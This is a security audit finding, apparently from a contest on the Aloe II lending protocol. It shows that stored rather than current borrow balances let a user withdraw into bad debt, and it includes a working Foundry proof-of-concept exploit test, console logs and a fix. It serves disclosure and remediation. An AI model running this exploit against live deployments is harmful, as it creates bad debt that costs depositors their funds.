Loud Cloud Salamander

high

# `Borrower`'s `modify`, `liquidate` and `warn` functions use stored (outdated) account liabilities which makes it possible for the user to intentionally put him into bad debt in 1 transaction
## Summary

`Borrower._getLiabilities()` function returns **stored** borrow balance:
```solidity
function _getLiabilities() private view returns (uint256 amount0, uint256 amount1) {
    amount0 = LENDER0.borrowBalanceStored(address(this));
    amount1 = LENDER1.borrowBalanceStored(address(this));
}
```

Stored balance is the balance **at the last interest settlement**, which is different (less) than current balance if there were no transactions accuring interest for this lender for some time. This means that this function returns outdated liabilities. For example:
t=100: borrower1 borrows 10000 USDT
... no transactions
t=200: borrower1 borrowBalance = 10000.1 USDT (due to accured interest), but borrowBalanceStored = 10000 USDT (the amount at last interest accural).

`_getLiabilities` function is used by `Borrower`'s `modify`, `liquidate` and `warn` functions, meaning that it works on outdated account borrow balances (liabilities), including health check. This leads to multiple problems, such as:
1. `warn` and `liquidate` will revert trying to liquidate some accounts which just became unhealthy but were healthy at the last interest accural
2. `liquidate` will not repay full account borrowBalances
3. `modify` will allow account to be unhealthy after the actions it performs, if it's healthy using outdated stored borrow balances

The first 2 problems can be worked around by calling `Lender.accrueInterest` before `warn` or `liquidation`, which will settle interest rate fixing this problem. However, the 3rd issue is a lot more serious and can't be worked around as it allows malicious user to intentionally create bad debt in 1 transaction which will cause loss of funds for the other users.

## Vulnerability Detail

Possible scenario for the intentional creation of bad debt:
1. Borrow max amount at max leverage + some safety margin so that position is healthy for the next few days, for example borrow 10000 DAI, add margin of 1051 DAI for safety (51 DAI required for MAX_LEVERAGE, 1000 DAI safety margin)
2. Wait for a long period of market inactivity (such as 1 day).
3. At this point `borrowBalance` is greater than `borrowBalanceStored` by a value higher than `MAX_LEVERAGE` (example: borrowBalance = 10630 DAI, borrowBalanceStored = 10000 DAI)
3. Call `modify` and withdraw max possible amount (based on `borrowBalanceStored`), for example, withdraw 1000 DAI (remaining assets = 10051 DAI, which is healthy based on stored balance of 10000 DAI, but in fact this is already a bad debt, because borrow balance is 10630, which is more than remaining assets). This works, because liabilities used are outdated.

At this point the user is already in bad debt, but due to points 1-2, it's still not liquidatable. After calling `Lender.accrueInterest` the account can be liquidated. This bad debt caused is the funds lost by the other users.

This scenario is not profitable to the malicious user, but can be modified to make it profitable: the user can deposit large amount to lender before these steps, meaning the inflated interest rate will be accured by user's deposit to lender, but it will not be paid by the user due to bad debt (user will deposit 1051 DAI, withdraw 1000 DAI, and gain some share of accured 630 DAI, for example if he doubles the lender's TVL, he will gain 315 DAI - protocol fees).

## Impact

Malicious user can create bad debt to his account in 1 transaction. Bad debt is the amount not withdrawable from the lender by users who deposited. Since users will know that the lender doesn't have enough assets to pay out to all users, it can cause bank run since first users to withdraw from lender will be able to do so, while those who are the last to withdraw will lose their funds.

## Proof of concept

The scenario above is demonstrated in the test, create test/Exploit.t.sol:
```ts
// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.17;

import "forge-std/Test.sol";

import {MAX_RATE, DEFAULT_ANTE, DEFAULT_N_SIGMA, LIQUIDATION_INCENTIVE} from "src/libraries/constants/Constants.sol";
import {Q96} from "src/libraries/constants/Q.sol";
import {zip} from "src/libraries/Positions.sol";

import "src/Borrower.sol";
import "src/Factory.sol";
import "src/Lender.sol";
import "src/RateModel.sol";

import {FatFactory, VolatilityOracleMock} from "./Utils.sol";

contract RateModelMax is IRateModel {
    uint256 private constant _A = 6.1010463348e20;

    uint256 private constant _B = _A / 1e18;

    /// @inheritdoc IRateModel
    function getYieldPerSecond(uint256 utilization, address) external pure returns (uint256) {
        unchecked {
            return (utilization < 0.99e18) ? _A / (1e18 - utilization) - _B : MAX_RATE;
        }
    }
}

contract ExploitTest is Test, IManager, ILiquidator {
    IUniswapV3Pool constant pool = IUniswapV3Pool(0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8);
    ERC20 constant asset0 = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    ERC20 constant asset1 = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    Lender immutable lender0;
    Lender immutable lender1;
    Borrower immutable account;

    constructor() {
        vm.createSelectFork(vm.rpcUrl("mainnet"));
        vm.rollFork(15_348_451);

        Factory factory = new FatFactory(
            address(0),
            address(0),
            VolatilityOracle(address(new VolatilityOracleMock())),
            new RateModelMax()
        );

        factory.createMarket(pool);
        (lender0, lender1, ) = factory.getMarket(pool);
        account = factory.createBorrower(pool, address(this), bytes12(0));
    }

    function setUp() public {
        // deal to lender and deposit (so that there are assets to borrow)
        deal(address(asset0), address(lender0), 10000e18); // DAI
        deal(address(asset1), address(lender1), 10000e18); // WETH
        lender0.deposit(10000e18, address(12345));
        lender1.deposit(10000e18, address(12345));

        deal(address(account), DEFAULT_ANTE + 1);
    }

    function test_selfLiquidation() public {

        // malicious user borrows at max leverage + some safety margin
        uint256 margin0 = 51e18 + 1000e18;
        uint256 borrows0 = 10000e18;

        deal(address(asset0), address(account), margin0);

        bytes memory data = abi.encode(Action.BORROW, borrows0, 0);
        account.modify(this, data, (1 << 32));

        assertEq(lender0.borrowBalance(address(account)), borrows0);
        assertEq(asset0.balanceOf(address(account)), borrows0 + margin0);

        // skip 1 day (without transactions)
        skip(86400);

        emit log_named_uint("User borrow:", lender0.borrowBalance(address(account)));
        emit log_named_uint("User stored borrow:", lender0.borrowBalanceStored(address(account)));

        // withdraw all the "extra" balance putting account into bad debt
        bytes memory data2 = abi.encode(Action.WITHDRAW, 1000e18, 0);
        account.modify(this, data2, (1 << 32));

        // account is still not liquidatable (because liquidation also uses stored liabilities)
        vm.expectRevert();
        account.warn((1 << 32));

        // make account liquidatable by settling accumulated interest
        lender0.accrueInterest();

        // warn account
        account.warn((1 << 32));

        // skip warning time
        skip(LIQUIDATION_GRACE_PERIOD);
        lender0.accrueInterest();

        // liquidation reverts because it requires asset the account doesn't have to swap
        vm.expectRevert();
        account.liquidate(this, bytes(""), 1, (1 << 32));

        emit log_named_uint("Before liquidation User borrow:", lender0.borrowBalance(address(account)));
        emit log_named_uint("Before liquidation User stored borrow:", lender0.borrowBalanceStored(address(account)));
        emit log_named_uint("Before liquidation User assets:", asset0.balanceOf(address(account)));

        // liquidate with max strain to avoid revert when trying to swap assets account doesn't have
        account.liquidate(this, bytes(""), type(uint256).max, (1 << 32));

        emit log_named_uint("Liquidated User borrow:", lender0.borrowBalance(address(account)));
        emit log_named_uint("Liquidated User assets:", asset0.balanceOf(address(account)));
    }

    enum Action {
        WITHDRAW,
        BORROW,
        UNI_DEPOSIT
    }

    // IManager
    function callback(bytes calldata data, address, uint208) external returns (uint208 positions) {
        require(msg.sender == address(account));

        (Action action, uint256 amount0, uint256 amount1) = abi.decode(data, (Action, uint256, uint256));

        if (action == Action.WITHDRAW) {
            account.transfer(amount0, amount1, address(this));
        } else if (action == Action.BORROW) {
            account.borrow(amount0, amount1, msg.sender);
        } else if (action == Action.UNI_DEPOSIT) {
            account.uniswapDeposit(-75600, -75540, 200000000000000000);
            positions = zip([-75600, -75540, 0, 0, 0, 0]);
        }
    }

    // ILiquidator
    receive() external payable {}

    function swap1For0(bytes calldata data, uint256 actual, uint256 expected0) external {
        /*
        uint256 expected = abi.decode(data, (uint256));
        if (expected == type(uint256).max) {
            Borrower(payable(msg.sender)).liquidate(this, data, 1, (1 << 32));
        }
        assertEq(actual, expected);
        */
        pool.swap(msg.sender, false, -int256(expected0), TickMath.MAX_SQRT_RATIO - 1, bytes(""));
    }

    function swap0For1(bytes calldata data, uint256 actual, uint256 expected1) external {
        /*
        uint256 expected = abi.decode(data, (uint256));
        if (expected == type(uint256).max) {
            Borrower(payable(msg.sender)).liquidate(this, data, 1, (1 << 32));
        }
        assertEq(actual, expected);
        */
        pool.swap(msg.sender, true, -int256(expected1), TickMath.MIN_SQRT_RATIO + 1, bytes(""));
    }

    // IUniswapV3SwapCallback
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        if (amount0Delta > 0) asset0.transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) asset1.transfer(msg.sender, uint256(amount1Delta));
    }

    // Factory mock
    function getParameters(IUniswapV3Pool) external pure returns (uint248 ante, uint8 nSigma) {
        ante = DEFAULT_ANTE;
        nSigma = DEFAULT_N_SIGMA;
    }

    // (helpers)
    function _setInterest(Lender lender, uint256 amount) private {
        bytes32 ID = bytes32(uint256(1));
        uint256 slot1 = uint256(vm.load(address(lender), ID));

        uint256 borrowBase = slot1 % (1 << 184);
        uint256 borrowIndex = slot1 >> 184;

        uint256 newSlot1 = borrowBase + (((borrowIndex * amount) / 10_000) << 184);
        vm.store(address(lender), ID, bytes32(newSlot1));
    }
}
```

Execution console log:
```solidity
  User borrow:: 10629296791890000000000
  User stored borrow:: 10000000000000000000000
  Before liquidation User borrow:: 10630197795010000000000
  Before liquidation User stored borrow:: 10630197795010000000000
  Before liquidation User assets:: 10051000000000000000000
  Liquidated User borrow:: 579197795010000000001
  Liquidated User assets:: 0
```

As can be seen, in the end user debt is 579 DAI with 0 assets.

## Code Snippet

`Borrower._getLiabilities()` returns stored balances:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L527-L530

`borrowBalanceStored` uses `borrowIndex` (which is index at last accural):
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Ledger.sol#L226-L232

For comparision, `borrowBalance` uses `_previewInterest` to get current borrow balance:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Ledger.sol#L216-L223

`Borrower.warn` uses `_getLiabilities`:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L166

`liquidate` uses `_getLiabilities`:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L211

`modify` also uses `_getLiabilities`:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L314


## Tool used

Manual Review

## Recommendation

Consider using `borrowBalance` instead of `borrowBalanceStored` in `_getLiabilities()`.
